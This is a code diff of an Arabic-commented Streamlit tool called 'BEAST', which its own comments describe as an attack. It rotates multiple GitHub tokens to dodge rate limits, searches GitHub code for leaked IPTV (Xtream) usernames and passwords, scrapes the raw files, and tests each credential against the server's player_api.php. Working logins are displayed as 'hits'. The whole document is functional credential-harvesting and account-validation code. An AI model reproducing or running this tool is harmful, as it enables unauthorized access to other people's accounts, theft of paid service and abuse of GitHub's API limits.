@@ -5,14 +5,11 @@ import time
 from datetime import datetime
 
 # إعدادات الواجهة
-st.set_page_config(page_title="BEAST V31 - MULTI-TOKEN", layout="wide")
+st.set_page_config(page_title="BEAST V32 - NUCLEAR SCAN", layout="wide")
 
-# نظام الدخول
-if "auth" not in st.session_state:
-    st.session_state.auth = False
-
+if "auth" not in st.session_state: st.session_state.auth = False
 if not st.session_state.auth:
-    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V31 - MULTI-TOKEN</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V32 - THE FINAL BYPASS</h1>", unsafe_allow_html=True)
     pwd = st.text_input("Password:", type="password")
     if st.button("دخول"):
         if pwd == "BEAST_V17_PRO":
@@ -20,112 +17,98 @@ if not st.session_state.auth:
             st.rerun()
     st.stop()
 
-# تنسيق الألوان المطور
+# ستايل الهكر المرعب
 st.markdown("""
 <style>
     .stApp { background-color: #000; }
-    .scan-log { color: #00d4ff; font-family: monospace; font-size: 13px; margin: 0; padding: 2px; }
-    .active-hit { 
-        background: #0d1117; border: 1px solid #00ff41; 
-        padding: 15px; border-radius: 8px; margin-bottom: 10px;
-    }
-    .text-green { color: #00ff41; font-weight: bold; }
-    .text-yellow { color: #fbbf24; }
-    .text-white { color: #fff; font-family: monospace; }
-    .cat-box { 
-        background: #1a1a1a; color: #888; font-size: 11px; 
-        padding: 5px; border-radius: 4px; border: 1px solid #333; margin-top: 5px;
+    .terminal-text { color: #00ff41; font-family: 'Courier New', Courier, monospace; font-size: 12px; }
+    .hit-card { 
+        background: #0a0a0a; border: 1px double #00ff41; 
+        padding: 15px; border-radius: 5px; margin-bottom: 10px;
+        box-shadow: 0px 0px 10px #00ff4133;
     }
 </style>
 """, unsafe_allow_html=True)
 
-# الجانب الجانبي لإدخال التوكنات
 with st.sidebar:
-    st.title("⚡ BEAST V31")
-    st.subheader("إعدادات الهجوم")
-    # ميزة إضافة أكثر من توكن (ضع كل توكن في سطر)
-    tokens_input = st.text_area("أدخل التوكنات (كل توكن في سطر):", height=150, placeholder="ghp_xxx...\nghp_yyy...")
-    tokens = [t.strip() for t in tokens_input.split('\n') if t.strip()]
+    st.title("🚀 BEAST V32 NUCLEAR")
+    tokens_raw = st.text_area("أدخل التوكنات (واحد في كل سطر):", height=150)
+    tokens_list = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
     
-    start = st.button("🚀 ابدأ الهجوم المليوني")
-    if tokens:
-        st.success(f"تم تحميل {len(tokens)} توكنات.")
-    else:
-        st.warning("يرجى إدخال توكن واحد على الأقل.")
+    st.subheader("🎯 إعدادات الاستهداف")
+    target_word = st.text_input("بحث عن باقة معينة (مثلاً: bein):", "")
+    depth = st.slider("عمق البحث في الصفحات:", 5, 50, 20)
+    
+    start_btn = st.button("🔥 إطلاق الهجوم الشامل")
 
-# مناطق العرض
-st.subheader("📡 الرادار المباشر (فحص التوكنات والنتائج)")
-status_area = st.empty()
-radar_area = st.empty()
+# مساحات العرض
+log_area = st.empty()
+hits_area = st.container()
 
-st.subheader("🏆 النتائج المكتشفة مع استعراض القوائم")
-hits_container = st.container()
-
-# المحرك الرئيسي
-if start and tokens:
-    # قائمة الدروكات الضخمة
-    dorks = [
-        'extension:txt "get.php?username=" "password="', 
-        'extension:m3u "player_api.php"',
-        'extension:php "panel_api.php" username password',
-        '"http://" "username=" "password=" "port" extension:txt',
-        'extension:json "server_url" "username"',
-        'extension:m3u8 "username=" "password="'
+if start_btn and tokens_list:
+    # دروكات "خبيثة" ومختلفة تماماً لزيادة النتائج
+    mega_dorks = [
+        f'"{target_word}" "get.php?username=" "password="' if target_word else 'extension:txt "get.php?username="',
+        'extension:m3u "http://" "username=" "password="',
+        'filename:settings.json "server_url" "password"',
+        'filename:.env "XTREAM_USER"',
+        'path:etc/php "username=" "password=" "http"',
+        'extension:log "player_api.php" "password="'
     ]
     
-    found_count = 0
-    token_index = 0
+    found_hits = 0
+    t_idx = 0 # مؤشر التوكنات
     
-    for dork in dorks:
-        for page in range(1, 21):
-            # نظام تبديل التوكنات الذكي
-            current_token = tokens[token_index % len(tokens)]
+    for dork in mega_dorks:
+        for page in range(1, depth + 1):
+            # تبديل التوكن لكل صفحة لزيادة السرعة وتجنب الحظر
+            current_token = tokens_list[t_idx % len(tokens_list)]
             headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
             
             try:
-                status_area.info(f"استخدام التوكن رقم { (token_index % len(tokens)) + 1} | البحث عن: {dork} | صفحة: {page}")
-                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50"
-                res = requests.get(search_url, headers=headers).json()
+                log_area.markdown(f"<p class='terminal-text'>[SYSTEM] Using Token: {current_token[:10]}... | Dork: {dork[:30]} | Page: {page}</p>", unsafe_allow_html=True)
                 
-                # التحقق من الحظر للتوكن الحالي
-                if "items" not in res:
-                    token_index += 1 # الانتقال للتوكن التالي فوراً
-                    status_area.error(f"التوكن الحالي وصل للحد الأقصى. يتم التبديل للتوكن التالي...")
-                    time.sleep(2)
+                # البحث باستخدام معايير مختلفة (sort by indexed لضمان السيرفرات الجديدة)
+                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100&sort=indexed"
+                response = requests.get(search_url, headers=headers).json()
+                
+                if "items" not in response:
+                    t_idx += 1 # التوكن ده تعب، خش على اللي بعده
+                    time.sleep(1)
                     continue
 
-                for item in res['items']:
+                for item in response['items']:
                     raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                     try:
-                        content = requests.get(raw_url, timeout=3).text
-                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
+                        file_content = requests.get(raw_url, timeout=2).text
+                        # Regex احترافي بيجيب السيرفر حتى لو في وسط كلام كتير
+                        links = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", file_content)
                         
-                        for m in matches:
-                            host, user, pw = m[0], m[1], m[2]
-                            radar_area.markdown(f"<p class='scan-log'>🔍 Checking: {host}...</p>", unsafe_allow_html=True)
-                            
+                        for host, user, pw in links:
                             try:
-                                api_base = f"{host}/player_api.php?username={user}&password={pw}"
-                                r = requests.get(api_base, timeout=2).json()
+                                # فحص السيرفر
+                                check_api = f"{host}/player_api.php?username={user}&password={pw}"
+                                res_check = requests.get(check_api, timeout=2).json()
                                 
-                                if r.get("user_info", {}).get("status") == "Active":
-                                    # جلب عينة من القوائم (Categories)
-                                    cat_res = requests.get(f"{api_base}&action=get_live_categories", timeout=2).json()
-                                    cat_names = [c.get('category_name') for c in cat_res[:10]] if isinstance(cat_res, list) else ["لا يوجد تصنيفات"]
+                                if res_check.get("user_info", {}).get("status") == "Active":
+                                    # جلب القنوات للتأكد من المحتوى
+                                    cat_req = requests.get(f"{check_api}&action=get_live_categories", timeout=2).json()
+                                    cat_names = [c['category_name'] for c in cat_req[:5]] if isinstance(cat_req, list) else ["No Data"]
                                     
-                                    found_count += 1
-                                    with hits_container:
+                                    found_hits += 1
+                                    with hits_area:
                                         st.markdown(f"""
-                                        <div class="active-hit">
-                                            <span class="text-green">✅ HIT #{found_count} - {host}</span><br>
-                                            <span class="text-white">USER: {user} | PASS: {pw}</span><br>
-                                            <div class="cat-box">
-                                                <b>📁 عينة من القوائم:</b> {' | '.join(cat_names)}...
+                                        <div class="hit-card">
+                                            <span style="color:#00ff41; font-weight:bold;">🏆 HIT #{found_hits}</span> | <code style="color:white;">{host}</code><br>
+                                            <span style="color:#fbbf24;">USER: {user} | PASS: {pw}</span><br>
+                                            <div style="color:#888; font-size:11px; margin-top:5px;">
+                                                <b>📦 القوائم:</b> {' | '.join(cat_names)}
                                             </div>
                                         </div>
                                         """, unsafe_allow_html=True)
                             except: continue
                     except: continue
-            except Exception as e:
-                token_index += 1
+            except: 
+                t_idx += 1
                 continue
+    log_area.success("✅ اكتمل الهجوم. راجع النتائج أعلاه.")
